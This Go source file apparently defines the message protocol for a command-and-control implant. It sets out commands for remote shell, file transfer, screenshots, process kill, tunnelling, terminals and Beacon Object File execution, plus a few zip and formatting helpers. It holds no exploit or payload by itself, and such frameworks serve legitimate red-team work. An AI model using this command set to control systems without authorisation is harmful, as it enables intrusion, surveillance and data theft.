package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"regexp"
	"strconv"
)

type Profile struct {
	Type        uint     `msgpack:"type"`
	Addresses   []string `msgpack:"addresses"`
	BannerSize  int      `msgpack:"banner_size"`
	ConnTimeout int      `msgpack:"conn_timeout"`
	ConnCount   int      `msgpack:"conn_count"`
	UseSSL      bool     `msgpack:"use_ssl"`
	SslCert     []byte   `msgpack:"ssl_cert"`
	SslKey      []byte   `msgpack:"ssl_key"`
	CaCert      []byte   `msgpack:"ca_cert"`
}

type SessionInfo struct {
	Process    string `msgpack:"process"`
	PID        int    `msgpack:"pid"`
	User       string `msgpack:"user"`
	Host       string `msgpack:"host"`
	Ipaddr     string `msgpack:"ipaddr"`
	Elevated   bool   `msgpack:"elevated"`
	Acp        uint32 `msgpack:"acp"`
	Oem        uint32 `msgpack:"oem"`
	Os         string `msgpack:"os"`
	OSVersion  string `msgpack:"os_version"`
	EncryptKey []byte `msgpack:"encrypt_key"`
}

/// Types

type Message struct {
	Type   int8     `msgpack:"type"`
	Object [][]byte `msgpack:"object"`
}

type Command struct {
	Code uint   `msgpack:"code"`
	Id   uint   `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type Job struct {
	CommandId uint   `msgpack:"command_id"`
	JobId     string `msgpack:"job_id"`
	Data      []byte `msgpack:"data"`
}

type AnsError struct {
	Error string `msgpack:"error"`
}

type AnsPwd struct {
	Path string `msgpack:"path"`
}

type ParamsCd struct {
	Path string `msgpack:"path"`
}

type ParamsShell struct {
	Program string   `msgpack:"program"`
	Args    []string `msgpack:"args"`
}

type AnsShell struct {
	Output string `msgpack:"output"`
}

type ParamsDownload struct {
	Task string `msgpack:"task"`
	Path string `msgpack:"path"`
}

type AnsDownload struct {
	FileId   int    `msgpack:"id"`
	Path     string `msgpack:"path"`
	Size     int    `msgpack:"size"`
	Content  []byte `msgpack:"content"`
	Start    bool   `msgpack:"start"`
	Finish   bool   `msgpack:"finish"`
	Canceled bool   `msgpack:"canceled"`
}

type ParamsUpload struct {
	Path    string `msgpack:"path"`
	Content []byte `msgpack:"content"`
	Finish  bool   `msgpack:"finish"`
}

type AnsUpload struct {
	Path string `msgpack:"path"`
}

type ParamsCat struct {
	Path string `msgpack:"path"`
}

type AnsCat struct {
	Path    string `msgpack:"path"`
	Content []byte `msgpack:"content"`
}

type ParamsCp struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsMv struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsMkdir struct {
	Path string `msgpack:"path"`
}

type ParamsRm struct {
	Path string `msgpack:"path"`
}

type ParamsLs struct {
	Path string `msgpack:"path"`
}

type FileInfo struct {
	Mode     string `msgpack:"mode"`
	Nlink    int    `msgpack:"nlink"`
	User     string `msgpack:"user"`
	Group    string `msgpack:"group"`
	Size     int64  `msgpack:"size"`
	Date     string `msgpack:"date"`
	Filename string `msgpack:"filename"`
	IsDir    bool   `msgpack:"is_dir"`
}

type AnsLs struct {
	Result bool   `msgpack:"result"`
	Status string `msgpack:"status"`
	Path   string `msgpack:"path"`
	Files  []byte `msgpack:"files"`
}

type PsInfo struct {
	Pid     int    `msgpack:"pid"`
	Ppid    int    `msgpack:"ppid"`
	Tty     string `msgpack:"tty"`
	Context string `msgpack:"context"`
	Process string `msgpack:"process"`
}

type AnsPs struct {
	Result    bool   `msgpack:"result"`
	Status    string `msgpack:"status"`
	Processes []byte `msgpack:"processes"`
}

type ParamsKill struct {
	Pid int `msgpack:"pid"`
}

type ParamsZip struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type AnsZip struct {
	Path string `msgpack:"path"`
}

type AnsScreenshots struct {
	Screens [][]byte `msgpack:"screens"`
}

type ParamsRun struct {
	Program string   `msgpack:"program"`
	Args    []string `msgpack:"args"`
	Task    string   `msgpack:"task"`
}

type AnsRun struct {
	Stdout string `msgpack:"stdout"`
	Stderr string `msgpack:"stderr"`
	Pid    int    `msgpack:"pid"`
	Start  bool   `msgpack:"start"`
	Finish bool   `msgpack:"finish"`
}

type JobInfo struct {
	JobId   string `msgpack:"job_id"`
	JobType int    `msgpack:"job_type"`
}

type AnsJobList struct {
	List []byte `msgpack:"list"`
}

type ParamsJobKill struct {
	Id string `msgpack:"id"`
}

type ParamsTunnelStart struct {
	Proto     string `msgpack:"proto"`
	ChannelId int    `msgpack:"channel_id"`
	Address   string `msgpack:"address"`
}

type ParamsTunnelStop struct {
	ChannelId int `msgpack:"channel_id"`
}

type ParamsTunnelPause struct {
	ChannelId int `msgpack:"channel_id"`
}

type ParamsTunnelResume struct {
	ChannelId int `msgpack:"channel_id"`
}

type ParamsTerminalStart struct {
	TermId  int    `msgpack:"term_id"`
	Program string `msgpack:"program"`
	Height  int    `msgpack:"height"`
	Width   int    `msgpack:"width"`
}

type ParamsTerminalStop struct {
	TermId int `msgpack:"term_id"`
}

type ParamsExecBof struct {
	Object   []byte `msgpack:"object"`
	ArgsPack string `msgpack:"argspack"`
	Task     string `msgpack:"task"`
}

type BofMsg struct {
	Type int    `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type AnsExecBof struct {
	Msgs []byte `msgpack:"msgs"`
}

const (
	COMMAND_ERROR      = 0
	COMMAND_PWD        = 1
	COMMAND_CD         = 2
	COMMAND_SHELL      = 3
	COMMAND_EXIT       = 4
	COMMAND_DOWNLOAD   = 5
	COMMAND_UPLOAD     = 6
	COMMAND_CAT        = 7
	COMMAND_CP         = 8
	COMMAND_MV         = 9
	COMMAND_MKDIR      = 10
	COMMAND_RM         = 11
	COMMAND_LS         = 12
	COMMAND_PS         = 13
	COMMAND_KILL       = 14
	COMMAND_ZIP        = 15
	COMMAND_SCREENSHOT = 16
	COMMAND_RUN        = 17
	COMMAND_JOB_LIST   = 18
	COMMAND_JOB_KILL   = 19
	COMMAND_REV2SELF   = 20

	COMMAND_TUNNEL_START  = 31
	COMMAND_TUNNEL_STOP   = 32
	COMMAND_TUNNEL_PAUSE  = 33
	COMMAND_TUNNEL_RESUME = 34

	COMMAND_TERMINAL_START = 35
	COMMAND_TERMINAL_STOP  = 36

	COMMAND_EXEC_BOF     = 50
	COMMAND_EXEC_BOF_OUT = 51

	CALLBACK_OUTPUT      = 0x0
	CALLBACK_OUTPUT_OEM  = 0x1e
	CALLBACK_OUTPUT_UTF8 = 0x20
	CALLBACK_ERROR       = 0x0d
	CALLBACK_CUSTOM      = 0x1000
	CALLBACK_CUSTOM_LAST = 0x13ff

	CALLBACK_AX_SCREENSHOT   = 0x81
	CALLBACK_AX_DOWNLOAD_MEM = 0x82
)

func parseDurationToSeconds(input string) (int, error) {
	re := regexp.MustCompile(`(\d+)(h|m|s)`)
	matches := re.FindAllStringSubmatch(input, -1)

	if matches == nil {
		input = input + "s"
		matches = re.FindAllStringSubmatch(input, -1)
	}

	totalSeconds := 0
	for _, match := range matches {
		value, err := strconv.Atoi(match[1])
		if err != nil {
			return 0, err
		}

		switch match[2] {
		case "h":
			totalSeconds += value * 3600
		case "m":
			totalSeconds += value * 60
		case "s":
			totalSeconds += value
		}
	}

	return totalSeconds, nil
}

func ZipBytes(data []byte, name string) ([]byte, error) {
	var buf bytes.Buffer
	zipWriter := zip.NewWriter(&buf)

	writer, err := zipWriter.Create(name)
	if err != nil {
		return nil, err
	}

	_, err = writer.Write(data)
	if err != nil {
		return nil, err
	}

	err = zipWriter.Close()
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func UnzipBytes(zipData []byte) (map[string][]byte, error) {
	result := make(map[string][]byte)
	reader := bytes.NewReader(zipData)

	zipReader, err := zip.NewReader(reader, int64(len(zipData)))
	if err != nil {
		return nil, err
	}

	for _, file := range zipReader.File {
		rc, err := file.Open()
		if err != nil {
			return nil, err
		}

		var buf bytes.Buffer
		_, err = io.Copy(&buf, rc)
		rc.Close()
		if err != nil {
			return nil, err
		}

		result[file.Name] = buf.Bytes()
	}

	return result, nil
}

func SizeBytesToFormat(bytes int64) string {
	const (
		KB = 1024.0
		MB = KB * 1024
		GB = MB * 1024
	)

	size := float64(bytes)

	if size >= GB {
		return fmt.Sprintf("%.2f Gb", size/GB)
	} else if size >= MB {
		return fmt.Sprintf("%.2f Mb", size/MB)
	}
	return fmt.Sprintf("%.2f Kb", size/KB)
}
